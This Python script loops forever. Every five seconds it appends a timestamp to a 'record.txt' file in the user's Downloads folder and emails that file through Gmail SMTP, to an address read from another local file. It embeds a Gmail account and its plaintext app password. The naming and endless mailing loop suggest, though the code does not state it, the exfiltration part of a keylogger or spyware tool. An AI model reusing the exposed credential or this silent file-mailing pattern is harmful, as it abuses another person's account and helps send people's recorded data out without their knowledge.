import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time
from getpass import getuser
# print("File      Path:", Path(__file__).absolute())
# print("Directory Path:", Path().absolute())
user = getuser()
file_path = f"C:\\Users\\{user}\\Downloads\\record.txt"
email_path = f"C:\\Users\\{user}\\Downloads\\email.txt"
current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
def sendmail(to_addr, subject, content, filename):
    from_addr = 'rak13.mails@gmail.com'
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    body = MIMEText(content, 'plain')
    msg.attach(body)
    with open(filename, 'r') as f:
        part = MIMEApplication(f.read(), Name=basename(filename))
        part['Content-Disposition'] = 'attachment; filename="{}"'.format(
            basename(filename))
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("rak13.mails@gmail.com", "arcvcobcstvtgkpa")
    server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])

to_addr=""
with open(email_path, 'r') as f:
    for i in f:
        to_addr+=i
        

subject = 'New Records '+current_time
content = ''

filename = file_path


while (True):
    print('Sending Mail to ' + to_addr)
    with open(file_path, "a") as FILE:
        FILE.write(f"time : {current_time} \n")
        FILE.close()
        
        
    sendmail(to_addr, subject, content, filename)
    
    time.sleep(5)
